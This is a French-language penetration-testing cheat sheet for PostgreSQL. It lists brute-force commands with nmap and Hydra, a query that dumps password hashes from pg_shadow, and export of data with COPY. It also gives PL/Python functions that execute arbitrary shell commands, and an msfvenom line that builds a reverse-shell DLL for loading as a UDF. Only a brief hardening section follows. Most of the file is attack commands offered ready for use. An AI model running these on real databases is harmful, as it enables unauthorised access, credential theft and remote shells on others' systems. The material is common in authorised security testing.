
# 🐘 PostgreSQL - Cheatsheet Cybersécurité

Ce fichier est orienté pentest & post-exploitation pour PostgreSQL : détection, accès, extraction de données, privilèges et exploitation.

---

## 🔍 1. Détection & Informations de connexion

nmap -p 5432 --script=pgsql-brute,pgsql-info <IP>
> Scan du port PostgreSQL + bruteforce + info version

psql -h <IP> -U postgres -p 5432
> Connexion manuelle à PostgreSQL

---

## 🔐 2. Authentification

hydra -L users.txt -P passwords.txt <IP> postgres
> Bruteforce PostgreSQL avec Hydra

---

## 📂 3. Commandes de base

\l
> Liste les bases de données

\c <database>
> Se connecter à une base

\dt
> Liste les tables

SELECT * FROM table;
> Lire le contenu d’une table

---

## 🧠 4. Extraction d’infos sensibles

SELECT usename, passwd FROM pg_shadow;
> Extraire les mots de passe des utilisateurs (si droits suffisants)

COPY (SELECT * FROM secrets) TO '/tmp/secrets.txt';
> Exporter des données vers le disque (si écriture autorisée)

---

## 🚀 5. Exécution de commandes système

CREATE OR REPLACE FUNCTION cmd_exec(text) RETURNS void AS $$
  import os; os.system(args[0])
$$ LANGUAGE plpythonu;
SELECT cmd_exec('id');
> Exécution de commandes shell via PL/Python

CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS text AS $$
  import subprocess; return subprocess.check_output(args[0], shell=True)
$$ LANGUAGE plpythonu;
SELECT exec_cmd('whoami');
> Variante plus flexible si plpython est activé

---

## 🛠 6. UDF (User Defined Function)

Utilisation d’UDF compilées pour exécuter du code arbitraire

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > shell.dll
> Créer une DLL shell reverse

Utiliser `copy` pour la placer, puis créer une fonction et l'appeler

---

## 🧱 7. Défense & durcissement

- Supprimer les langages non utilisés : `REVOKE USAGE ON LANGUAGE plpythonu FROM public;`
- Restreindre l’accès réseau dans `pg_hba.conf`
- Utiliser une authentification forte
- Vérifier les droits d’utilisateurs avec ` \du`

---

## 📌 Ressources utiles

- https://book.hacktricks.xyz/network-services-pentesting/postgresql
- https://www.postgresql.org/docs/current/sql.html
```
